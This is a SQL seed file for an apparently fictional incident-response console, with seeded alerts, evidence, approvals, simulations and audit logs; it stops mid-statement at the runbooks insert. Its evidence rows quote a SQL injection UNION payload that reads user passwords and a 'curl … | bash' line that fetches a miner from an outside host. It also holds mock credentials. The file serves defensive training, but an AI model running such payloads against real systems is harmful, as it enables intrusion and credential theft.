INSERT INTO public.alerts (id, title, source, timestamp, severity, status, affected_service, detection_type, assigned_responder, related_incident_id, raw_payload, history)
VALUES ('ALT-9049', 'High Ingress WAF Rule Matches for SQL Injection Payload', 'Cloudflare WAF', '2026-09-30T14:52:00Z', 'High', 'Escalated', 'customer-portal-api', 'OWASP SQLi Rule 942100 Triggered', 'Marcus Vance', 'INC-2026-0891', '{"matched_expression":"1'' UNION SELECT username, password FROM users --","source_ip":"45.154.255.89","action_taken":"Blocked by Edge WAF"}'::jsonb, '[{"timestamp":"2026-09-30T14:52:00Z","action":"Payload intercepted by edge firewall","actor":"Cloudflare"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.alerts (id, title, source, timestamp, severity, status, affected_service, detection_type, assigned_responder, related_incident_id, raw_payload, history)
VALUES ('ALT-9050', 'S3 Bucket Public Access Block Setting Disabled', 'AWS Config & Macie', '2026-09-30T11:45:00Z', 'Medium', 'Suppressed', 'aws-storage-s3', 'Configuration Drift Alert', 'Sarah Connor', NULL, '{"bucket_name":"cyberops-public-marketing-assets","state":"PublicReadAllowed","reason":"Authorized public media release bucket"}'::jsonb, '[{"timestamp":"2026-09-30T11:45:00Z","action":"Suppression approved per policy tag","actor":"Sarah Connor"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

-- Evidence Seed
INSERT INTO public.evidence (id, incident_id, title, type, description, content, source, collected_by, collection_timestamp, hash, hash_verified, chain_of_custody, redacted, file_size)
VALUES ('EVD-101', 'INC-2026-0891', 'Envoy Ingress Proxy Access Log Excerpt with Secrets', 'log_snippet', 'High-volume HTTP 504 error response slice captured from ingress controller pod during latency peak.', '[2026-09-30T14:48:12.110Z] "POST /v1/checkout/charge HTTP/1.1" 504 - 12452 0 "client_ip=45.154.255.89"
Authorization: Bearer sk_mock_9942a8b27c19f091823abce18293d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
X-Forwarded-For: 45.154.255.89
upstream_connect_status: TIMED_OUT [target: 10.244.3.44:8080]
db_connection_ref: postgresql://db_user:password=SecretPassWord123!@10.244.1.20:5432/payments
X-Trace-ID: trc-991204-ae89', 'k8s-ingress-prod-envoy-7c89b7-pl90', 'Elena Rostova', '2026-09-30T14:52:00Z', '33e9474169b31d1b6493fa0df69b31d1c2a2d89e4d0fd57b7d3727dbb510fd57', true, '[{"timestamp":"2026-09-30T14:52:00Z","action":"Captured from FluentBit log stream","user":"Elena Rostova","details":"Stream verified and cryptographically signed"},{"timestamp":"2026-09-30T14:55:00Z","action":"Submitted to Incident Evidence Vault","user":"Elena Rostova","details":"SHA-256 integrity hash calculated"}]'::jsonb, true, '4.2 KB')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.evidence (id, incident_id, title, type, description, content, source, collected_by, collection_timestamp, hash, hash_verified, chain_of_custody, redacted, file_size)
VALUES ('EVD-102', 'INC-2026-0891', 'TCP Connection Pool Diagnostic Output', 'diagnostic_output', 'Netstat and TCP socket state dump indicating socket starvation on payment gateway backend.', 'Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0  44120 10.244.3.44:8080        10.244.1.20:5432        ESTABLISHED 1489/java
tcp        0      0 10.244.3.44:8080        45.154.255.89:49812     TIME_WAIT   -
tcp      340      0 10.244.3.44:8080        45.154.255.89:49813     SYN_RECV    -
tcp      420      0 10.244.3.44:8080        45.154.255.89:49814     SYN_RECV    -
Total TCP Sockets: 8420 [ESTABLISHED: 1040, SYN_RECV: 3890, TIME_WAIT: 3490]
System Socket Limit: 4096 (EXCEEDED)', 'payment-gw-prod-01 [10.244.3.44]', 'David Chen', '2026-09-30T14:56:00Z', '32ffa3b368a5f9e962cf4d2ad68a5f9e8296fb50170ec39f8f362f9dee30ec39', true, '[{"timestamp":"2026-09-30T14:56:00Z","action":"Diagnostic telemetry collected via SSH agent","user":"David Chen","details":"Read-only diagnostic command output"}]'::jsonb, false, '1.8 KB')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.evidence (id, incident_id, title, type, description, content, source, collected_by, collection_timestamp, hash, hash_verified, chain_of_custody, redacted, file_size)
VALUES ('EVD-103', 'INC-2026-0892', 'Okta Auth Audit Logs with Compromised Token Request', 'event_record', 'Security event record documenting rapid credential brute force attempts with exposed API credentials.', '{"eventType":"user.authentication.auth_via_mfa","outcome":"FAILURE","reason":"INVALID_CREDENTIALS",
"actor":{"id":"usr-unknown","alternateId":"admin@cyberops.corp"},
"client":{"ipAddress":"185.220.101.44","geographicalContext":{"country":"Unknown","city":"Tor Exit"}},
"debugContext":{"debugData":{"auth_header":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
"client_secret":"sk_mock_auth_9812739182470129","retry_count":842}}}', 'Okta System Log API', 'Elena Rostova', '2026-09-30T14:38:00Z', '361834106c426e5668cee4df06c426e552bf3aa4d00a2408343979b75100a240', true, '[{"timestamp":"2026-09-30T14:38:00Z","action":"Exported from Okta SIEM connector","user":"Elena Rostova","details":"Automated ingest into investigation ticket"}]'::jsonb, true, '3.1 KB')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.evidence (id, incident_id, title, type, description, content, source, collected_by, collection_timestamp, hash, hash_verified, chain_of_custody, redacted, file_size)
VALUES ('EVD-104', 'INC-2026-0895', 'Volatile Memory Process String Dump & C2 Artifacts', 'diagnostic_output', 'Forensic memory capture extraction showing hidden binary strings and socket descriptors.', '--- PROCESS MEMORY FORENSICS (PID 4410: /tmp/.hidden_kswapd) ---
Executable Path: /tmp/.hidden_kswapd (Deleted from filesystem)
Parent PID: 1 (init/containerd-shim)
Network Connection: 10.244.4.12:44192 -> 185.220.101.5:2222 (ESTABLISHED)
Extracted String Artifacts:
  - "SSH-2.0-Adversary-C2-Drop"
  - "AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE"
  - "-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0Z9w2g...[CONFIDENTIAL_KEY_BLOCK]...
-----END RSA PRIVATE KEY-----"
  - "sh -c curl -s http://185.220.101.5/miner.sh | bash"
MD5: 44b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5
SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'k8s-worker-node-04 [VPC Subnet B]', 'Elena Rostova', '2026-09-30T13:35:00Z', '22b673d478ec298e4341806ac78ec298f1c343e1c41e8a4fe824e1db1141e8a4', true, '[{"timestamp":"2026-09-30T13:35:00Z","action":"Volatile memory acquired via LiME forensic module","user":"Elena Rostova","details":"Zero write to host storage verified"},{"timestamp":"2026-09-30T13:40:00Z","action":"Sealed into evidence repository","user":"Elena Rostova","details":"Tamper evident seal verified"}]'::jsonb, true, '8.4 KB')
ON CONFLICT (id) DO NOTHING;

-- Tasks Seed
INSERT INTO public.tasks (id, incident_id, title, description, assigned_to, assigned_to_avatar, priority, status, due_time, created_time, completion_time, approval_required, approval_request_id)
VALUES ('TSK-501', 'INC-2026-0891', 'Run Diagnostic Thread Dump on Payment Service Pods', 'Trigger safe read-only JVM thread dump on payment-gw-prod-01 to diagnose stuck HTTP handler threads.', 'David Chen', 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=120&auto=format&fit=crop&q=80', 'P1 - Urgent', 'In Progress', '2026-09-30T15:30:00Z', '2026-09-30T14:50:00Z', NULL, false, NULL)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.tasks (id, incident_id, title, description, assigned_to, assigned_to_avatar, priority, status, due_time, created_time, completion_time, approval_required, approval_request_id)
VALUES ('TSK-502', 'INC-2026-0891', 'Request Approval for Edge Rate-Limiting Filter on /v1/checkout', 'Apply dynamic token bucket rate-limiting at Cloudflare edge to throttle abusive client IP range 45.154.255.0/24.', 'Marcus Vance', 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=120&auto=format&fit=crop&q=80', 'P1 - Urgent', 'Awaiting Approval', '2026-09-30T15:15:00Z', '2026-09-30T14:52:00Z', NULL, true, 'APR-201')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.tasks (id, incident_id, title, description, assigned_to, assigned_to_avatar, priority, status, due_time, created_time, completion_time, approval_required, approval_request_id)
VALUES ('TSK-503', 'INC-2026-0891', 'Scale Up Payment Pod Replicas from 4 to 12', 'Increase horizontal pod autoscaler minimum replicas to alleviate socket backlog.', 'David Chen', NULL, 'P2 - High', 'Pending', '2026-09-30T15:45:00Z', '2026-09-30T14:55:00Z', NULL, true, 'APR-202')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.tasks (id, incident_id, title, description, assigned_to, assigned_to_avatar, priority, status, due_time, created_time, completion_time, approval_required, approval_request_id)
VALUES ('TSK-504', 'INC-2026-0892', 'Audit Locked User Accounts for Compromise Evidence', 'Review Okta event records for 18 locked accounts to confirm zero successful token issues occurred.', 'Elena Rostova', NULL, 'P1 - Urgent', 'In Progress', '2026-09-30T15:30:00Z', '2026-09-30T14:35:00Z', NULL, false, NULL)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.tasks (id, incident_id, title, description, assigned_to, assigned_to_avatar, priority, status, due_time, created_time, completion_time, approval_required, approval_request_id)
VALUES ('TSK-505', 'INC-2026-0892', 'Deploy WAF Bot Management Challenge for Autonomous ASN 14061', 'Enable Cloudflare Turnstile JavaScript challenge for high-risk ASN traffic targeting login endpoints.', 'Elena Rostova', NULL, 'P1 - Urgent', 'Completed', '2026-09-30T14:50:00Z', '2026-09-30T14:36:00Z', '2026-09-30T14:48:00Z', true, 'APR-203')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.tasks (id, incident_id, title, description, assigned_to, assigned_to_avatar, priority, status, due_time, created_time, completion_time, approval_required, approval_request_id)
VALUES ('TSK-506', 'INC-2026-0893', 'Terminate Long-Running Exclusive Lock on Table orders_v2', 'Kill PID 4491 holding ExclusiveLock to unfreeze pending write transactions.', 'David Chen', NULL, 'P1 - Urgent', 'Awaiting Approval', '2026-09-30T15:10:00Z', '2026-09-30T14:28:00Z', NULL, true, 'APR-204')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.tasks (id, incident_id, title, description, assigned_to, assigned_to_avatar, priority, status, due_time, created_time, completion_time, approval_required, approval_request_id)
VALUES ('TSK-507', 'INC-2026-0895', 'Quarantine Worker Node k8s-04 via VPC Security Group', 'Apply isolated quarantine security group to sever all ingress and egress except management bastion.', 'Elena Rostova', NULL, 'P1 - Urgent', 'Completed', '2026-09-30T13:45:00Z', '2026-09-30T13:20:00Z', '2026-09-30T13:30:00Z', true, 'APR-205')
ON CONFLICT (id) DO NOTHING;

-- Approvals Seed
INSERT INTO public.approvals (id, incident_id, incident_title, action_title, requested_action, requested_by, ai_recommendation_source, risk_level, reason, required_permission, created_time, expiration_time, status, reviewed_by, review_timestamp, review_comment)
VALUES ('APR-201', 'INC-2026-0891', 'Critical Gateway Latency & 504 Storm on Payment API', 'Enforce Edge Rate Limiting on IP Subnet 45.154.255.0/24', 'Apply Cloudflare WAF rate limiting rule (limit: 5 req/min) across payment API path.', 'AI Copilot Recommendation & David Chen', 'Diagnostic Action #DIA-101 (Approved Runbook RBK-01 Step 3)', 'Medium', 'Traffic analysis demonstrates anomalous client volume from ASN 14061 exhausting Envoy ingress socket limits.', 'approve_actions', '2026-09-30T14:52:00Z', '2026-09-30T16:52:00Z', 'Pending', NULL, NULL, NULL)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.approvals (id, incident_id, incident_title, action_title, requested_action, requested_by, ai_recommendation_source, risk_level, reason, required_permission, created_time, expiration_time, status, reviewed_by, review_timestamp, review_comment)
VALUES ('APR-202', 'INC-2026-0891', 'Critical Gateway Latency & 504 Storm on Payment API', 'Scale Up Payment Pod Replicas from 4 to 12', 'kubectl scale deployment payment-gateway --replicas=12 -n production', 'David Chen', 'Approved Runbook RBK-01 Step 4', 'Medium', 'Alleviate CPU throttling and pending queue connections during high volume checkout period.', 'approve_actions', '2026-09-30T14:55:00Z', '2026-09-30T16:55:00Z', 'Pending', NULL, NULL, NULL)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.approvals (id, incident_id, incident_title, action_title, requested_action, requested_by, ai_recommendation_source, risk_level, reason, required_permission, created_time, expiration_time, status, reviewed_by, review_timestamp, review_comment)
VALUES ('APR-204', 'INC-2026-0893', 'PostgreSQL Primary Connection Exhaustion & Lock Contention', 'Terminate Blocked Transaction PID 4491 via pg_terminate_backend()', 'SELECT pg_terminate_backend(4491); on PostgreSQL Primary Cluster.', 'David Chen', 'Approved Runbook RBK-02 Step 3', 'High', 'PID 4491 has held an ExclusiveLock for >24 minutes, blocking 140 incoming customer writes.', 'approve_actions', '2026-09-30T14:28:00Z', '2026-09-30T15:28:00Z', 'Pending', NULL, NULL, NULL)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.approvals (id, incident_id, incident_title, action_title, requested_action, requested_by, ai_recommendation_source, risk_level, reason, required_permission, created_time, expiration_time, status, reviewed_by, review_timestamp, review_comment)
VALUES ('APR-205', 'INC-2026-0895', 'Anomalous Outbound C2 Beaconing on Worker Node k8s-04', 'Isolate Host k8s-worker-node-04 in Quarantine Security Group', 'Modify AWS ENI security group attachment to sg-04forensics-quarantine.', 'Elena Rostova', 'Approved Runbook RBK-04 Step 2', 'Critical', 'Immediate network quarantine required to disrupt active C2 beaconing while preserving volatile memory.', 'approve_actions', '2026-09-30T13:22:00Z', '2026-09-30T14:22:00Z', 'Approved', 'Marcus Vance', '2026-09-30T13:25:00Z', 'Approved immediately under emergency containment protocol. Volatile memory capture confirmed first.')
ON CONFLICT (id) DO NOTHING;

-- Diagnostics Seed
INSERT INTO public.diagnostics (id, incident_id, action_name, description, why_recommended, expected_information_gain, risk_level, required_permission, approval_required, status, execution_result, created_at)
VALUES ('DIA-101', 'INC-2026-0891', 'Inspect Envoy Ingress Socket & Upstream Error Metrics', 'Query Envoy proxy admin endpoint (/stats/prometheus) to verify socket allocation and backlog queue depth.', 'Identifies whether failure originates in ingress proxy connection saturation or downstream microservice crash.', 'Pinpoints upstream cluster timeouts and TCP socket exhaustion status.', 'Low', 'view_evidence', false, 'Executed', 'Sockets: 8,420 total. Ingress queue limit reached. Upstream pods returning 504 to Envoy.', '2026-09-30T14:49:00Z')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.diagnostics (id, incident_id, action_name, description, why_recommended, expected_information_gain, risk_level, required_permission, approval_required, status, execution_result, created_at)
VALUES ('DIA-102', 'INC-2026-0891', 'Compare Current Checkout Traffic to 14-Day Baseline', 'Run statistical anomaly comparison of incoming RPS vs 14-day rolling mean.', 'Determines whether the 504 storm is driven by legitimate flash crowd or distributed volumetric attack.', 'Traffic volume is 2.8x standard baseline with 92% concentration from ASN 14061.', 'Low', 'view_evidence', false, 'Executed', 'Statistical divergence confirmed: +280% RPS anomaly detected.', '2026-09-30T14:50:00Z')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.diagnostics (id, incident_id, action_name, description, why_recommended, expected_information_gain, risk_level, required_permission, approval_required, status, execution_result, created_at)
VALUES ('DIA-103', 'INC-2026-0891', 'Simulate Edge Rate-Limiting Rule on Subnet 45.154.255.0/24', 'Deploy mock Cloudflare WAF token bucket throttling to shield payment gateway API.', 'Safely mitigates upstream queue saturation without altering core application code or persistence.', 'Expected 75% reduction in ingress queue load within 60 seconds.', 'Medium', 'approve_actions', true, 'Approval Requested', NULL, '2026-09-30T14:52:00Z')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.diagnostics (id, incident_id, action_name, description, why_recommended, expected_information_gain, risk_level, required_permission, approval_required, status, execution_result, created_at)
VALUES ('DIA-104', 'INC-2026-0893', 'Sample Active Long-Running Queries via pg_stat_activity', 'Execute read-only query on PostgreSQL internal catalog to inspect queries in active state > 30s.', 'Isolates the exact SQL query and transaction holding row-level locks on orders table.', 'Revealed PID 4491 running unindexed reporting scan with ExclusiveLock.', 'Low', 'view_evidence', false, 'Executed', 'Found query: SELECT * FROM orders_v2 WHERE created_at < NOW() FOR UPDATE (PID 4491).', '2026-09-30T14:22:00Z')
ON CONFLICT (id) DO NOTHING;

-- Timeline Seed
INSERT INTO public.timeline (id, timestamp, type, title, description, actor, metadata)
VALUES ('EVT-01', '2026-09-30T14:48:00Z', 'alert_trigger', 'Cloudflare Ingress Alert ALT-9041 Fired', 'Repeated HTTP 504 Gateway Timeouts detected on payment gateway service.', 'Cloudflare Telemetry', NULL)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.timeline (id, timestamp, type, title, description, actor, metadata)
VALUES ('EVT-02', '2026-09-30T14:49:00Z', 'commander_assigned', 'Incident Commander Marcus Vance Assumed Role', 'Marcus Vance assigned as primary commander for INC-2026-0891.', 'Marcus Vance', NULL)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.timeline (id, timestamp, type, title, description, actor, metadata)
VALUES ('EVT-03', '2026-09-30T14:50:00Z', 'ai_recommendation', 'AI Copilot Synthesized Incident Blast Radius', 'Copilot generated preliminary impact analysis and matched Approved Runbook RBK-01.', 'AI Copilot', NULL)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.timeline (id, timestamp, type, title, description, actor, metadata)
VALUES ('EVT-04', '2026-09-30T14:52:00Z', 'evidence_added', 'Envoy Access Logs EVD-101 Added with Secrets Redacted', 'Log sample uploaded to evidence repository; API key and DB password masked automatically.', 'Elena Rostova', NULL)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.timeline (id, timestamp, type, title, description, actor, metadata)
VALUES ('EVT-05', '2026-09-30T14:54:00Z', 'approval_granted', 'Approval Request APR-201 Created', 'Approval requested for Edge rate limiting on /v1/checkout path.', 'David Chen', NULL)
ON CONFLICT (id) DO NOTHING;

-- Audit Logs Seed
INSERT INTO public.audit_logs (id, timestamp, user_name, role, action, resource, incident_id, ip_address, user_agent, result, previous_state_hash, current_state_hash, details)
VALUES ('AUD-8801', '2026-09-30T14:55:00Z', 'David Chen', 'Responder', 'APPROVAL_REQUEST_SUBMITTED', 'ApprovalCenter / APR-201', 'INC-2026-0891', '10.20.4.11', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SecOpsConsole/2.4', 'Success', '3dcb52b0679108f677b9f0350679108f53235332f001f76e9441a807db001f76', '3dcb52af679108f577b9f0331679108f43235332e301f76e9341a807d9f01f76', 'Submitted approval request for rate limiting action on IP range 45.154.255.0/24.')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.audit_logs (id, timestamp, user_name, role, action, resource, incident_id, ip_address, user_agent, result, previous_state_hash, current_state_hash, details)
VALUES ('AUD-8802', '2026-09-30T14:52:00Z', 'Elena Rostova', 'Security Analyst', 'EVIDENCE_COLLECTED_AND_REDACTED', 'EvidenceManager / EVD-101', 'INC-2026-0891', '10.20.4.14', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) SecOpsConsole/2.4', 'Success', '3dcb52af679108f577b9f0331679108f43235332e301f76e9341a807d9f01f76', '3dcb52ae679108f877b9f0312679108f73235332d601f76e9241a807d8e01f76', 'Captured Envoy ingress log. 2 sensitive tokens automatically detected and redacted.')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.audit_logs (id, timestamp, user_name, role, action, resource, incident_id, ip_address, user_agent, result, previous_state_hash, current_state_hash, details)
VALUES ('AUD-8803', '2026-09-30T14:50:00Z', 'AI Copilot Engine', 'Viewer', 'AI_SYNTHESIS_AND_RECOMMENDATION_GENERATED', 'IncidentCopilot / INC-2026-0891', 'INC-2026-0891', '127.0.0.1 (Internal Service)', 'AICopilotDaemon/1.0', 'Success', '3dcb52ae679108f877b9f0312679108f73235332d601f76e9241a807d8e01f76', '3dcb52ad679108f777b9f02f3679108f63235332c901f76e9141a807d7d01f76', 'Generated incident summary and recommended diagnostic steps from Approved Runbook RBK-01.')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.audit_logs (id, timestamp, user_name, role, action, resource, incident_id, ip_address, user_agent, result, previous_state_hash, current_state_hash, details)
VALUES ('AUD-8804', '2026-09-30T13:25:00Z', 'Marcus Vance', 'Incident Commander', 'EMERGENCY_APPROVAL_GRANTED', 'ApprovalCenter / APR-205', 'INC-2026-0895', '10.20.4.9', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SecOpsConsole/2.4', 'Success', '3dcb52ad679108f777b9f02f3679108f63235332c901f76e9141a807d7d01f76', '3dcb52ac679108f277b9f02d4679108f13235332bc01f76e9841a807d6c01f76', 'Granted emergency quarantine approval for compromised host k8s-worker-node-04.')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.audit_logs (id, timestamp, user_name, role, action, resource, incident_id, ip_address, user_agent, result, previous_state_hash, current_state_hash, details)
VALUES ('AUD-8805', '2026-09-30T13:20:00Z', 'Sarah Connor', 'Admin', 'USER_ROLE_UPDATED', 'UserManagement / usr-4', NULL, '10.20.4.2', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SecOpsConsole/2.4', 'Success', '3dcb52ac679108f277b9f02d4679108f13235332bc01f76e9841a807d6c01f76', '3dcb52ab679108f177b9f02b5679108f03235332af01f76e9741a807d5b01f76', 'Assigned Responder role permissions to David Chen (SRE team).')
ON CONFLICT (id) DO NOTHING;

-- Integrations Seed
INSERT INTO public.integrations (id, name, type, status, last_event_time, events_received_count, webhook_url, secret_masked, enabled, description)
VALUES ('int-1', 'Datadog APM & Metrics', 'Monitoring System', 'Connected', '2026-09-30T15:02:00Z', 14290, 'https://api.cyberops.corp/webhooks/v1/datadog-ingest', 'whsec_99a812************', true, 'Receives infrastructure APM traces, error threshold warnings, and host health telemetry.')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.integrations (id, name, type, status, last_event_time, events_received_count, webhook_url, secret_masked, enabled, description)
VALUES ('int-2', 'Splunk Enterprise SIEM', 'SIEM', 'Connected', '2026-09-30T15:04:00Z', 48920, 'https://api.cyberops.corp/webhooks/v1/splunk-events', 'splk_live_4490************', true, 'Central security information and correlation engine forwarding critical security alerts.')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.integrations (id, name, type, status, last_event_time, events_received_count, webhook_url, secret_masked, enabled, description)
VALUES ('int-3', 'AWS GuardDuty & SecurityHub', 'Cloud Platform', 'Connected', '2026-09-30T14:45:00Z', 1104, 'https://api.cyberops.corp/webhooks/v1/aws-guardduty', 'aws_sig_3921************', true, 'Cloud environment threat detection analyzing CloudTrail management events and VPC flow logs.')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.integrations (id, name, type, status, last_event_time, events_received_count, webhook_url, secret_masked, enabled, description)
VALUES ('int-4', 'Slack #secops-war-room', 'Slack', 'Connected', '2026-09-30T15:05:00Z', 3820, 'https://hooks.slack.com/services/T00/B00/secops-dispatch', 'xoxb-991204************', true, 'Real-time broadcast channel for high-priority incidents, approval requests, and resolution updates.')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.integrations (id, name, type, status, last_event_time, events_received_count, webhook_url, secret_masked, enabled, description)
VALUES ('int-5', 'Microsoft Teams Emergency Ops', 'Microsoft Teams', 'Degraded', '2026-09-30T12:20:00Z', 840, 'https://outlook.office.com/webhook/secops-msteams', 'msteams_sec_************', false, 'Secondary incident broadcasting channel for cross-departmental executive leadership.')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.integrations (id, name, type, status, last_event_time, events_received_count, webhook_url, secret_masked, enabled, description)
VALUES ('int-6', 'Jira Enterprise Security Desk', 'Ticketing System', 'Connected', '2026-09-30T14:58:00Z', 2940, 'https://cyberops.atlassian.net/rest/api/3/webhook', 'jira_tok_9912************', true, 'Bi-directional synchronization of incident tasks, remediation tickets, and post-mortem items.')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.integrations (id, name, type, status, last_event_time, events_received_count, webhook_url, secret_masked, enabled, description)
VALUES ('int-7', 'PagerDuty On-Call Escalation', 'Email Alerting', 'Connected', '2026-09-30T14:48:00Z', 512, 'https://events.pagerduty.com/v2/enqueue', 'pd_service_ky_************', true, 'Automated on-call rotation paging for Critical severity incidents.')
ON CONFLICT (id) DO NOTHING;

-- Simulations Seed
INSERT INTO public.simulations (id, name, category, description, severity, symptoms, mock_alerts, steps, expected_diagnostics)
VALUES ('sim-01', 'Distributed API Outage & Latency Spike', 'Application', 'Simulate high ingress volume causing Envoy proxy timeouts (504 storm) across core customer APIs.', 'Critical', '["P99 latency increases from 80ms to 11,500ms","HTTP 504 error rate spikes to 42%","Worker pool socket exhaustion on payment gateway"]'::jsonb, '[{"title":"Simulated Ingress 504 Gateway Timeout Spike","source":"Envoy Ingress Telemetry","severity":"Critical"},{"title":"Simulated Downstream Service Queue Congestion","source":"Datadog APM","severity":"High"}]'::jsonb, '["Select Simulation Scenario","Confirm Environment Guardrails (Sandbox Isolated)","Trigger Mock High-Traffic Influx","Generate Correlated Telemetry & Alert Stream","Create Simulated Incident Ticket","AI Copilot Synthesizes Root Cause","Review Diagnostic Recommendations","Require Human Approval for Mitigation","Simulate Edge Rate-Limiting Execution","Verify Simulated Incident Resolution"]'::jsonb, '[{"actionName":"Inspect Ingress Sockets & Socket Queue","risk":"Low","rationale":"Verify where packet buffer queue is stalling."},{"actionName":"Enable Edge Rate Limiting on Abusive Subnet","risk":"Medium","rationale":"Quarantine volumetric traffic spike."}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.simulations (id, name, category, description, severity, symptoms, mock_alerts, steps, expected_diagnostics)
VALUES ('sim-02', 'PostgreSQL Database Connection Pool Exhaustion', 'Database', 'Simulate database lock contention holding exclusive locks and driving active connections to 99%.', 'High', '["Active backend connections climb to 990 / 1000","Query wait times exceed 20 seconds","PgBouncer queue depth escalates rapidly"]'::jsonb, '[{"title":"Simulated PostgreSQL Connection Pool 98% Full","source":"Datadog DB Monitoring","severity":"High"},{"title":"Simulated Blocked Query Count Exceeded Threshold","source":"PostgreSQL Exporter","severity":"High"}]'::jsonb, '["Select Simulation Scenario","Inject Simulated Hanging Analytical Query","Observe Connection Saturation in Live Stream","Launch AI Copilot Diagnostic Review","Recommend pg_terminate_backend Execution","Require Incident Commander Sign-off","Execute Mock Query Termination","Observe Connection Pool Recovery"]'::jsonb, '[{"actionName":"Inspect Active Locks via pg_stat_activity","risk":"Low","rationale":"Find the blocker PID."},{"actionName":"Terminate Blocked Transaction via pg_terminate_backend","risk":"High","rationale":"Unfreeze table locks."}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.simulations (id, name, category, description, severity, symptoms, mock_alerts, steps, expected_diagnostics)
VALUES ('sim-03', 'Distributed Credential Stuffing & Brute Force', 'Authentication', 'Simulate automated botnet rotating leaked user passwords across identity endpoints.', 'Critical', '["10,000+ failed login events in 5 minutes","High distinct IP rotation (>300 subnets)","Account lockout alerts firing across support desk"]'::jsonb, '[{"title":"Simulated High-Volume Failed Authentication Surge","source":"Okta Identity SIEM","severity":"Critical"},{"title":"Simulated Anomalous ASN Rotation Pattern","source":"Cloudflare WAF","severity":"High"}]'::jsonb, '["Select Scenario & Launch Simulation","Generate Credential Stuffing Alert Telemetry","AI Copilot Flags Leaked Credential Patterns","Suggest Mandatory Step-Up Hardware Token MFA","Commander Evaluates Risk and Approves Policy","Apply Simulated WAF Bot Mitigation Rule","Audit Resolution in Tamper-Evident Ledger"]'::jsonb, '[{"actionName":"Aggregate ASN & Geolocation Dispersion","risk":"Low","rationale":"Map proxy origins."},{"actionName":"Deploy Edge Turnstile Challenge Rule","risk":"Medium","rationale":"Stop automated scrapers."}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.simulations (id, name, category, description, severity, symptoms, mock_alerts, steps, expected_diagnostics)
VALUES ('sim-04', 'Worker Node Malware Beaconing / Unauthorized Tunnel', 'Infrastructure', 'Simulate an isolated host executing anomalous outbound encrypted traffic to test containment workflows.', 'Critical', '["Outbound SSH traffic to unknown external port 2222","Suspicious binary spawned from /tmp directory","CrowdStrike Falcon behavioral anomaly trigger"]'::jsonb, '[{"title":"Simulated C2 Beaconing Signature Match","source":"CrowdStrike Falcon","severity":"Critical"},{"title":"Simulated Volatile Memory Anomaly Detected","source":"Suricata NIDS","severity":"Critical"}]'::jsonb, '["Launch Malicious Beaconing Simulation","Inspect Mock Memory Dump Evidence","AI Recommends Immediate Isolation","Human Commander Confirms Containment","Simulate VPC Security Group Quarantine","Verify Safe Resolution and Audit Chain"]'::jsonb, '[{"actionName":"Acquire Volatile Memory Snapshot","risk":"Low","rationale":"Capture volatile evidence."},{"actionName":"Apply Security Group Quarantine Isolation","risk":"Critical","rationale":"Sever lateral threat path."}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

-- Runbooks Seed
INSERT INTO public.runbooks (id, name, category, version, approval_status, last_reviewed_date, owner, matched_incident_types, description, steps)
